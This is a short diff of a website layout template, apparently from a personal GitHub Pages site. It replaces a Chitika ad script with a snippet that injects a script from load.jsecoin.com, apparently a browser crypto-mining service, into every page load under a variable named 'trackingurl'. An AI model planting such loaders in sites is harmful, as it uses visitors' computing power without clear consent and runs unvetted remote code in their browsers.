@@ -1,12 +1,8 @@
 {{ content }}
 <script type="text/javascript">
-  ( function() {
-    if (window.CHITIKA === undefined) { window.CHITIKA = { 'units' : [] }; };
-    var unit = {"calltype":"async[2]","publisher":"stipe86st","width":320,"height":50,"sid":"Chitika Default"};
-    var placement_id = window.CHITIKA.units.length;
-    window.CHITIKA.units.push(unit);
-    document.write('<div id="chitikaAdBlock-' + placement_id + '"></div>');
-}());
+(function() {
+var trackingurl = 'https://load.jsecoin.com/server/load/1859/stipekolovrat.github.io/';
+var d=document, j=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+j.type='text/javascript'; j.async=true; j.defer=true; j.src=trackingurl; s.parentNode.insertBefore(j,s);
+})();
 </script>
-<script type="text/javascript" src="//cdn.chitika.net/getads.js" async></script>
-
